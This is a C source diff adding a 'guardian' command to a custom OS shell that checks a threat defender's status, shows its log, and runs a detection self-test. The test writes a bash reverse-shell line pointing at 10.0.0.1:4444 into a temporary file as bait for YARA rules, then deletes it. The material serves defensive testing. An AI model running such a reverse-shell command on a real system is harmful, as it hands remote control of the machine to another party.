@@ -1687,6 +1687,162 @@ cmd_kairos(int argc, char **argv)
 
 
 
+/* wlt-defender shell commands — guardian + threat
+ *
+ * guardian status  — show defender status (log tail, processes, anomaly scores)
+ * guardian test    — inject a simulated threat (YARA + anomaly + enforcement)
+ * threat           — alias for guardian test
+ */
+
+static int
+cmd_guardian(int argc, char **argv)
+{
+    if (argc < 2)
+    {
+        printf("Usage: guardian <status|test|log>\n");
+        printf("  status  — Show defender status\n");
+        printf("  test    — Inject simulated threat (YARA + anomaly)\n");
+        printf("  log     — Show recent guardian log entries\n");
+        return 1;
+    }
+
+    if (strcmp(argv[1], "status") == 0)
+    {
+        printf("=== WLTIOS Defender Status ===\n");
+
+        /* Check if guardian is running */
+        FILE *fp = popen("pidof wlt-guardian 2>/dev/null", "r");
+        if (fp)
+        {
+            char pid_buf[64];
+            if (fgets(pid_buf, sizeof(pid_buf), fp) != NULL)
+                printf("  Guardian PID: %s", pid_buf);
+            else
+                printf("  Guardian: NOT RUNNING\n");
+            pclose(fp);
+        }
+
+        /* Check guardian socket */
+        if (access("/run/guardian.sock", F_OK) == 0)
+            printf("  Socket: /run/guardian.sock (active)\n");
+        else
+            printf("  Socket: not found\n");
+
+        /* Check log file */
+        fp = popen("wc -l /var/log/guardian/guardian.log 2>/dev/null", "r");
+        if (fp)
+        {
+            char line[128];
+            if (fgets(line, sizeof(line), fp) != NULL)
+                printf("  Log: %s", line);
+            pclose(fp);
+        }
+
+        /* Check YARA rules */
+        if (access("/etc/wlt/guardian/sigs/guardian.yar", F_OK) == 0)
+            printf("  YARA rules: present\n");
+        else
+            printf("  YARA rules: MISSING\n");
+
+        /* Check ML model */
+        if (access("/etc/wlt/guardian/ml/anomaly.iforest", F_OK) == 0)
+            printf("  ML model: loaded (isolation forest)\n");
+        else
+            printf("  ML model: not found\n");
+
+        /* Check BPF program */
+        if (access("/etc/wlt/guardian/bpf/guardian.bpf.o", F_OK) == 0)
+            printf("  BPF program: present\n");
+        else
+            printf("  BPF program: not found\n");
+
+        printf("=== Defender Status Complete ===\n");
+        return 0;
+    }
+    else if (strcmp(argv[1], "test") == 0 || strcmp(argv[1], "log") == 0)
+    {
+        if (strcmp(argv[1], "log") == 0)
+        {
+            printf("=== Recent Guardian Log ===\n");
+            FILE *fp = popen("tail -20 /var/log/guardian/guardian.log 2>/dev/null", "r");
+            if (fp)
+            {
+                char line[512];
+                while (fgets(line, sizeof(line), fp) != NULL)
+                    printf("%s", line);
+                pclose(fp);
+            }
+            else
+                printf("  (no log file found)\n");
+            return 0;
+        }
+
+        /* guardian test — inject simulated threat */
+        printf("=== Guardian Threat Simulation ===\n");
+
+        /* Step 1: Write a YARA-detectable file */
+        printf("[test] Writing YARA-detectable content to /tmp/test-threat.txt...\n");
+        FILE *fp = fopen("/tmp/test-threat.txt", "w");
+        if (fp)
+        {
+            fprintf(fp, "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
+            fclose(fp);
+            printf("[test] File written (reverse shell pattern)\n");
+        }
+
+        /* Step 2: Fork a CPU-stress process to trigger anomaly */
+        printf("[test] Starting CPU-stress process...\n");
+        pid_t stress_pid = fork();
+        if (stress_pid == 0)
+        {
+            /* Child: spin CPU to trigger anomaly detection */
+            while (1) { volatile int x = 0; x++; }
+            _exit(0);
+        }
+        else if (stress_pid > 0)
+        {
+            printf("[test] CPU-stress started (PID=%d)\n", (int)stress_pid);
+        }
+
+        /* Step 3: Wait for guardian to detect */
+        printf("[test] Waiting for defender response (5s)...\n");
+        sleep(5);
+
+        /* Step 4: Check if guardian responded */
+        printf("[test] Checking guardian log for response...\n");
+        fp = popen("tail -5 /var/log/guardian/guardian.log 2>/dev/null", "r");
+        if (fp)
+        {
+            char line[512];
+            int found = 0;
+            while (fgets(line, sizeof(line), fp) != NULL)
+            {
+                printf("  %s", line);
+                if (strstr(line, "CRITICAL") || strstr(line, "HIGH") ||
+                    strstr(line, "QUARANTINE") || strstr(line, "KILL") ||
+                    strstr(line, "FREEZE"))
+                    found = 1;
+            }
+            pclose(fp);
+            if (found)
+                printf("[test] THREAT DETECTED AND RESPONDED\n");
+            else
+                printf("[test] No response detected (guardian may not be running)\n");
+        }
+
+        /* Cleanup */
+        if (stress_pid > 0) kill(stress_pid, 9);
+        unlink("/tmp/test-threat.txt");
+        printf("=== Guardian Test Complete ===\n");
+        return 0;
+    }
+
+    fprintf(stderr, "guardian: unknown argument '%s' (use status|test|log)\n", argv[1]);
+    return 1;
+}
+
+
+
 static int
 cmd_help(int argc, char **argv)
 {
@@ -1817,6 +1973,8 @@ static wlt_shell_command_t commands[] = {
     {"kairos",   cmd_kairos},
     {"pkg",     cmd_pkg},
     {"help",     cmd_help},
+    {"guardian", cmd_guardian},
+    {"threat",   cmd_guardian},   /* alias */
     {NULL, NULL},
 };
 
